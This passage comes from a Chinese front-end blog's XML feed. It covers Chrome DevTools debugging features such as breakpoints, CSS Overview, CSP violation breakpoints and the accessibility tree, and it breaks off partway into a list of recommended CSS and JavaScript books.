data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651304357549-af958461-e9c1-42d1-811d-cbd788912183.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>详见：</strong><a href="https://developer.chrome.com/blog/new-in-devtools-65/#overrides">https://developer.chrome.com/blog/new-in-devtools-65/#overrides</a></p><p><a name="FfLeP"></a></p><h2 id="7-全局搜索代码"><a href="#7-全局搜索代码" class="headerlink" title="7. 全局搜索代码"></a>7. 全局搜索代码<br /><br /></h2><p>Chrome 浏览器为我们提供了全局搜索的概念，可以点击开发者工具右上角的三个点，点击 Search 选项，在 Search 面板中搜索所需关键字即可，点击搜索结果即可跳到对应文件的代码行：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651305104380-1da86b2e-e47d-49e2-813d-3637a4508bf5.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651305104380-1da86b2e-e47d-49e2-813d-3637a4508bf5.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="jF640"></a></p><h2 id="8-事件监听器的断点"><a href="#8-事件监听器的断点" class="headerlink" title="8. 事件监听器的断点"></a>8. 事件监听器的断点<br /><br /></h2><p>有时应用会在用户发生交互时出现问题，这时我们就可以添加事件监听器添加断点来捕获这些事件以检查交互时的问题。可以在 Source 面板右侧的 Event Listener Breakpoints 中勾选相应的事件：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651299456311-c5f42be7-cb05-40bd-8cd9-36cb517bd0d0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651299456311-c5f42be7-cb05-40bd-8cd9-36cb517bd0d0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="Z6q8R"></a></p><h2 id="9-DOM-操作的断点"><a href="#9-DOM-操作的断点" class="headerlink" title="9. DOM 操作的断点"></a>9. DOM 操作的断点<br /><br /></h2><p>当页面的内容发生变化时，如果想要知道是哪些脚本影响了它，就可以给 DOM 设置断点。我们可以右键点击需要设置断点的 DOM 元素，在弹出的菜单中点击 Break on 以选择合适的断点。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651299494410-396bdd62-3622-4e16-b71d-7d4a3979b09e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651299494410-396bdd62-3622-4e16-b71d-7d4a3979b09e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="CHMLA"></a></p><h2 id="10-异步请求的断点"><a href="#10-异步请求的断点" class="headerlink" title="10. 异步请求的断点"></a>10. 异步请求的断点<br /><br /></h2><p>XHR breakpoints 可以用于异步请求的断点，点击加号即可添加断点规则，输入请求 的 URL 地址（片段），会在请求地址包含对应字符串的异步请求发出的位置自动停止：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651305461865-5abc3c59-779e-48a8-8ead-9f4053335b11.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1651305461865-5abc3c59-779e-48a8-8ead-9f4053335b11.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 调试 </tag>
            
            <tag> 技巧 </tag>
            
            <tag> DevTools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Devtools 实用功能（2）</title>
      <link href="/2023/07/01/frontend/collection/skill/devtools-shi-yong-gong-neng-2/"/>
      <url>/2023/07/01/frontend/collection/skill/devtools-shi-yong-gong-neng-2/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>Chrome DevTools 是前端开发人员最常用的工具之一，今天我们就来看 5 个 Chrome DevTools 中实用的实验性功能，开启这些隐藏功能，让你的 Chrome 更加强大！<br />本文中使用的 Chrome 浏览器版本：99.0.4844.74（正式版本） (arm64)</p><p><a name="RZ0BJ"></a></p><h2 id="1-CSS-Overview"><a href="#1-CSS-Overview" class="headerlink" title="1. CSS Overview"></a>1. CSS Overview<br /><br /></h2><p>在 Chrome 的管理面板中，开启 CSS Overview 面板之后，就可以查看当前网站的样式信息了，包括颜色信息、字体信息、媒体查询等。当我们需要优化页面的 CSS 时，这个功能就派上用场了。除此之外，还可以使用该功能方便地查看其他优秀网站的样式信息。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647528675796-87d47de5-33ad-417e-b2f1-497a2efa3e25.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647528675796-87d47de5-33ad-417e-b2f1-497a2efa3e25.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>默认情况下，该面板是不开启的，可以通过以下步骤来开启此功能：<br />1 在任意页面打开 Chrome 浏览器的 DevTools；<br />2 单击<strong>更多选项</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647529067040-d2c8f1c7-11b1-429d-a2fd-644b288fec19.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647529067040-d2c8f1c7-11b1-429d-a2fd-644b288fec19.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br /> -&gt; <strong>More tools</strong> -&gt; <strong>CSS Overview</strong>。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647529230654-2cc87cba-f897-4852-8fa5-5608cee326ba.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647529230654-2cc87cba-f897-4852-8fa5-5608cee326ba.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>那该如何使用 CSS Overview 面板呢？很简单，只需要点击 <strong>Capture overview</strong> 按钮来生成页面的 CSS overview 报告即可。如果想重新运行 CSS Overview，只需点击左上角的<strong>清除</strong>图标，然后再点击 **Capture overview **按钮即可。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647529613210-bb241b16-2c1d-4355-ad2a-ca28c2985348.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647529613210-bb241b16-2c1d-4355-ad2a-ca28c2985348.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>CSS Overview 报告主要由五部分组成：<br />（1）<strong>Overview summary：</strong>页面 CSS 的高级摘要</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647529937848-15f1c63a-3c66-4bc6-ab4c-8b696c01d3a8.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647529937848-15f1c63a-3c66-4bc6-ab4c-8b696c01d3a8.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>（2）<strong>Colors：</strong>页面中的所有颜色。颜色按背景颜色、文本颜色等用途分组。它还显示了具有低对比度问题的文本。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647529919286-3f02a31a-8083-4c9d-bd47-93c613880c7c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647529919286-3f02a31a-8083-4c9d-bd47-93c613880c7c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>每种颜色都是可点击的。我们可以单击它以获取使用该颜色的元素列表。将鼠标悬停在列表中的元素上就可以突出显示页面中对应的元素。<strong>单击列表中的元素就可以在“Elements</strong>”面板中打开该元素。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647530083972-dadb663f-85e9-4050-aa54-584424667362.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647530083972-dadb663f-85e9-4050-aa54-584424667362.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>（3）<strong>Font info：字体信息，</strong>页面中的所有字体及其出现，按不同的字体大小、字体粗细和行高分组。与<strong>颜色</strong>部分类似，可以单击以查看受影响元素的列表。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647530313891-83835c50-888a-4684-8015-1b86df3082e2.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647530313891-83835c50-888a-4684-8015-1b86df3082e2.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>（4）<strong>Unused declarations：</strong>未使用的声明，包含所有无效的样式，按原因分组。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647530531647-23870dfc-1d1a-482d-86be-05f8b47cfd3a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647530531647-23870dfc-1d1a-482d-86be-05f8b47cfd3a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>（5）<strong>Media queries：</strong>媒体查询，页面中定义的所有媒体查询，按出现次数最高的排序。单击可以查看受影响元素的列表。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647530598606-b14934b2-0a42-4266-a1a0-8c85b4f9fd00.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647530598606-b14934b2-0a42-4266-a1a0-8c85b4f9fd00.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="URHm0"></a></p><h2 id="2-CSP-违规断点"><a href="#2-CSP-违规断点" class="headerlink" title="2. CSP 违规断点"></a>2. CSP 违规断点<br /><br /></h2><p><strong>Chrome DevTools CSP 违规断点可以捕捉到与 CSP 违规有关的可能的异常，并在代码中指出这些异常。</strong><br />CSP 即内容安全策略，它允许限制网站中的某些行为以提高安全性。例如，CSP 可用于禁止内联脚本或禁止 eval，这两者都可以减少跨站脚本 (XSS)攻击的攻击面。</p><p>一个特别新的 CSP 是可信类型 (TT)策略，它支持动态分析，可以系统地防止对网站的一大类注入攻击。为了实现这一点，TT 支持网站监管其 JavaScript 代码，只允许将某些类型的东西分配给 DOM 接收器，例如 innerHTML。</p><p>网站可以通过包含特定的 HTTP 标头来激活内容安全策略。例如，标头 content-security-policy: require-trusted-types-for ‘script’; trusted-types default 激活页面的 TT 策略。</p><p>目前，调试 TT 违规的唯一方法是在 JS 异常上设置断点。由于强制 TT 违规将触发异常，因此此功能可能会很有用。但是，在现实的场景中，需要对 TT 违规进行更细粒度的控制。特别是，我们希望仅在 TT 违规（而不是其他异常）上中断，也在仅报告模式下中断，并区分不同类型的 TT 违规。<br />启用该功能将为应用程序增加一个额外的安全层，减少跨站脚本（XSS）等漏洞。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647531115160-ad409623-0ff9-44b0-b548-6e3880075a22.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647531115160-ad409623-0ff9-44b0-b548-6e3880075a22.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>那该如何启用该功能呢？可以通过以下步骤来开启此功能：<br />1 在任意页面打开 Chrome 浏览器的 DevTools；<br />2 点击右上角<strong>设置</strong>图标 -&gt; 选中左侧 <strong>Experiments</strong> -&gt; 勾选 <strong>Show CSP Violations view；</strong></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647531260277-6ba49932-cc72-436e-83ea-2a960929f98b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647531260277-6ba49932-cc72-436e-83ea-2a960929f98b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>3 重启浏览器的 DevTools；<br />4 在 <strong>CSP Violations Breakpoints <strong>下选择</strong> Trusted Type Violations</strong> 即可。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647531606179-fb2fc607-0c1e-4e89-b53c-56b0c878db6f.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647531606179-fb2fc607-0c1e-4e89-b53c-56b0c878db6f.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>当遇到有安全问题的代码时，Chrome DevTools 甚至会显示如何修复改问题。</p><p><a name="ZcMfT"></a></p><h2 id="3-新的字体编辑器工具"><a href="#3-新的字体编辑器工具" class="headerlink" title="3. 新的字体编辑器工具"></a>3. 新的字体编辑器工具<br /><br /></h2><p>Chrome DevTools 提供了一个实验性的字体编辑器工具，可以用来改变字体设置。可以用它来改变<strong>字体、大小、粗细、行高、字符间距</strong>，并实时看到变化。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647532300410-e74d70bf-6618-495b-80bb-745e192b4a51.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647532300410-e74d70bf-6618-495b-80bb-745e192b4a51.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>那该如何启用该功能呢？可以通过以下步骤来开启此功能：<br />1 在任意页面打开 Chrome 浏览器的 DevTools；<br />2 点击右上角<strong>设置</strong>图标 -&gt; 选中左侧 <strong>Experiments</strong> -&gt; 勾选 <strong>Enable New Font Editor Tools within Styles Pane；</strong></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647532442547-b8e4f1af-3306-43da-a1dc-66a5328e9f8c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647532442547-b8e4f1af-3306-43da-a1dc-66a5328e9f8c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>3 重启浏览器的 DevTools；<br />4 选择 HTML 元素，其中包括想改变的字体，点击字体图标即可。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647532540151-e0f2a93a-1a7d-4b6f-b4f0-cde1af29e758.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647532540151-e0f2a93a-1a7d-4b6f-b4f0-cde1af29e758.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="sTYkq"></a></p><h2 id="4-双屏模式"><a href="#4-双屏模式" class="headerlink" title="4. 双屏模式"></a>4. 双屏模式<br /><br /></h2><p>通过启用双屏模式，可以在 Chrome DevTools 模拟器的双屏设备上调试你的 web 应用。这对于开发要适配折叠屏手机的应用是非常有用的。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647532898473-71563238-8e62-4426-8932-f495df4a3903.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647532898473-71563238-8e62-4426-8932-f495df4a3903.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>那该如何启用该功能呢？可以通过以下步骤来开启此功能：<br />1 在任意页面打开 Chrome 浏览器的 DevTools；<br />2 点击右上角<strong>设置</strong>图标 -&gt; 选中左侧 <strong>Experiments</strong> -&gt; 勾选 <strong>Emulation: Support dual-screen mode；</strong></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647532740523-49345138-cacd-438d-8306-8f96b344bf72.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647532740523-49345138-cacd-438d-8306-8f96b344bf72.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>3 重启浏览器的 DevTools；<br />4① 切换到移动设备调试 -&gt; ② 选择一个双屏设备 -&gt; ③ 点击上方的切换双屏模式。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647533071586-66a31cc6-6485-466d-920f-88ed0671ff33.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647533071586-66a31cc6-6485-466d-920f-88ed0671ff33.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="ieKJO"></a></p><h2 id="5-完整的可访问性树视图"><a href="#5-完整的可访问性树视图" class="headerlink" title="5. 完整的可访问性树视图"></a>5. 完整的可访问性树视图<br /><br /></h2><p>通过 Chrome DevTools Accessibility Tree，可以检查为每个 DOM 元素创建的可访问性对象。这项功能与 Elements 选项卡相似，但使用它可以深入探索应用的更多可访问性细节。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647533735899-00bdbd92-0a56-45e0-81a7-fae1bb03dae6.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647533735899-00bdbd92-0a56-45e0-81a7-fae1bb03dae6.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647533517481-595a6091-af99-4848-b1c0-300109170614.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647533517481-595a6091-af99-4848-b1c0-300109170614.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>3 重启浏览器的 DevTools；<br />4 在 Elements 面板中点击右上角的无障碍按钮，将元素视图模式切换为无障碍树视图。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647533713034-7283131a-e2ea-4323-9229-2da97f7d08e1.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1647533713034-7283131a-e2ea-4323-9229-2da97f7d08e1.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 调试 </tag>
            
            <tag> 技巧 </tag>
            
            <tag> DevTools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端书籍</title>
      <link href="/2023/06/30/frontend/collection/qian-duan-shu-ji/"/>
      <url>/2023/06/30/frontend/collection/qian-duan-shu-ji/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665057509766-b7c4f501-702f-4a73-b29a-9b949c8a5395.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665057509766-b7c4f501-702f-4a73-b29a-9b949c8a5395.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>1. CSS</strong><br /><strong>（1）CSS 世界、CSS 新世界</strong><br />CSS 世界三部曲中的其中两部，都是关于 CSS 的进阶读物，作者结合自己多年的从业经验，讲解 CSS 基础知识，并充分考虑前端开发者的需求，以 CSS 新特性的历史背景为线索，去粗取精，注重细节，深入浅出地介绍了上百个 CSS 新特性。主要目标是帮助前端开发者突破 CSS 技能提升的瓶颈，非常适合具有一定 CSS 基础的前端开发者阅读。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665034843214-353df50c-b69a-44ef-8fb2-55fe1428cf5d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665034843214-353df50c-b69a-44ef-8fb2-55fe1428cf5d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）CSS 权威指南（第四版）（上下册）</strong><br />本书展示了如何通过布局、过渡和动画、边框、背景、文本属性，以及许多其他工具和技术来改善用户体验、加快开发速度、避免潜在的错误。对 CSS 进行了系统的讲解，适合当工具书来阅读。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665034986124-81eaea1a-8413-4dc1-9bd8-b3050e2e3067.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665034986124-81eaea1a-8413-4dc1-9bd8-b3050e2e3067.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（3）CSS 揭秘</strong><br />本书是一本注重实践的教程，作者为我们揭示了 47 个鲜为人知的 CSS 技巧，主要内容包括背景与边框、形状、视觉效果、字体排印、用户体验、结构与布局、过渡与动画等。适合有一定 CSS 基础的开发者阅读。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665035060259-3ce599ae-a5d7-4143-a6c6-51753d2096f6.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665035060259-3ce599ae-a5d7-4143-a6c6-51753d2096f6.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（4）深入解析 CSS</strong><br />本书旨在帮你深度掌握 CSS 语言，并快速了解 CSS 的新进展和新特性。书中不仅有讲解透彻的概念介绍，而且还有详细的分步示例，能够帮助你提升 CSS 开发技能。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665035161806-7a7b6f48-1c70-4de2-8298-6f3188acf9b9.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1665035161806-7a7b6f48-1c70-4de2-8298-6f3188acf9b9.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>2. JavaScript</strong><br /><strong>（1）JavaScript 高级程序设计（第 4 版）</strong><br 